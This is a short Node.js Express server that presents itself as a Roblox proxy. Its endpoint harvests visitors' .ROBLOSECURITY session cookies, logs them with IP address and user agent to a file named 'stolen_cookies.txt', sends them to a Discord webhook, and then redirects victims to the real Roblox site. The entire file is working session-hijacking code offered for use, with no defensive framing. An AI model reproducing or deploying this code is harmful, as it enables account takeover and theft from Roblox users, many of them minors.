const express = require('express');
const fs = require('fs');
const app = express();
app.use(express.json());

// Endpoint that mimics Roblox to capture HttpOnly cookies
app.get('/roblox-proxy/*', (req, res) => {
    const cookies = req.headers.cookie;
    const ip = req.ip;
    
    // Look for .ROBLOSECURITY
    if (cookies && cookies.includes('.ROBLOSECURITY')) {
        const secMatch = cookies.match(/\.ROBLOSECURITY=([^;]+)/);
        if (secMatch) {
            fs.appendFile('stolen_cookies.txt', 
                `[${new Date().toISOString()}] IP: ${ip}\n` +
                `Cookie: ${secMatch[1]}\n` +
                `UA: ${req.headers['user-agent']}\n` +
                '---\n', 
                () => {}
            );
            
            // Also send to Discord
            fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🎯 .ROBLOSECURITY CAPTURED!\nIP: ${ip}\nCookie: ${secMatch[1].substring(0, 50)}...`
                })
            });
        }
    }
    
    // Redirect to real Roblox
    res.redirect('https://www.roblox.com' + req.path.replace('/roblox-proxy', ''));
});

app.listen(3000, () => console.log('Cookie capture server running'));
